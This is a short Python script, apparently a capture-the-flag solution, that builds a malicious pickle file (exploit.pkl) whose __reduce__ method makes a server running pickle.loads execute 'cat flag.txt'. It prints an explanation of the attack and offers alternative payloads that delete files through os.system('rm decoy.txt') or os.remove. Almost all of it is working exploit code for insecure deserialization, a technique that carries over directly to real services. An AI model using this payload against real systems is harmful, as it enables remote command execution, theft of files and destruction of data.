class MaliciousPickle:
    def __reduce__(self):
        # Return a tuple of (callable, args) that gets executed during deserialization
        # This will read flag.txt directly when the pickle is loaded
        # Using subprocess.check_output to capture the flag
        import subprocess
        return (subprocess.check_output, (['cat', 'flag.txt'],))

# Create the malicious object
malicious_obj = MaliciousPickle()

# Serialize to pickle file
try:
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(malicious_obj, f)
    
    # Verify the file was created successfully
    if os.path.exists('exploit.pkl'):
        file_size = os.path.getsize('exploit.pkl')
        print("[SUCCESS] Malicious pickle payload created successfully!")
        print(f"[INFO] Filename: exploit.pkl")
        print(f"[INFO] File size: {file_size} bytes")
        print("\n[PAYLOAD DESCRIPTION]")
        print("When this pickle is deserialized by the server using pickle.loads():")
        print("1. The __reduce__ method is called")
        print("2. It returns (subprocess.check_output, (['cat', 'flag.txt'],))")
        print("3. pickle.loads() executes: subprocess.check_output(['cat', 'flag.txt'])")
        print("4. This reads the contents of flag.txt and returns them")
        print("5. The flag will appear in the server's output/response")
        print("\n[ALTERNATIVE COMMANDS]")
        print("To delete decoy.txt instead, modify __reduce__ to:")
        print("  return (os.system, ('rm decoy.txt',))")
        print("  OR")
        print("  return (os.remove, ('decoy.txt',))")
    else:
        print("[ERROR] exploit.pkl was not created")
        
except Exception as e:
    print(f"[ERROR] Failed to create pickle: {str(e)}")
